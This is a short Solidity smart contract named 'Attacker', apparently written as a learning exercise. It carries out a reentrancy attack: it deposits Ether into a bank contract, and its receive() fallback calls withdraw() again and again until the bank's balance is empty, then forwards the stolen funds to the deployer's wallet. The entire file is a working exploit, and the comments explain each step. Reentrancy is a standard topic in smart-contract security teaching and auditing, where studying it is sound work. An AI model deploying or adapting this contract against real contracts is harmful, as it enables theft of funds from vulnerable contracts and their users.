//SPDX-License-Identifier: Unlicense 
pragma solidity ^0.8.0; 
import '@openzeppelin/contracts/access/Ownable.sol';

interface IBank { //I stands for interface before each one accessing a contract
    function deposit() external payable; 
    function withdraw() external; 
}


contract Attacker is Ownable { // when we add ownable library from open zeppelin we are able to automatically assign person that deployed the contract
    IBank public immutable bank; 
    

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable { 
        // we call deposit 
            bank.deposit{value: msg.value}();
        // then withdraw back to back in the same function. but withdraw is called before the deposit function is done. 
            bank.withdraw();
    }

    // receive will be here to get the money from the contract. 
    // in this function we callback attack. 

    receive() external payable { // smart contract allows to receive ether here
        
        if(address(bank).balance > 0 ) {
        bank.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);// sends money to personal wallet when the money is done being transferred from bank smart contract to attacker smart contract
        }

    }
}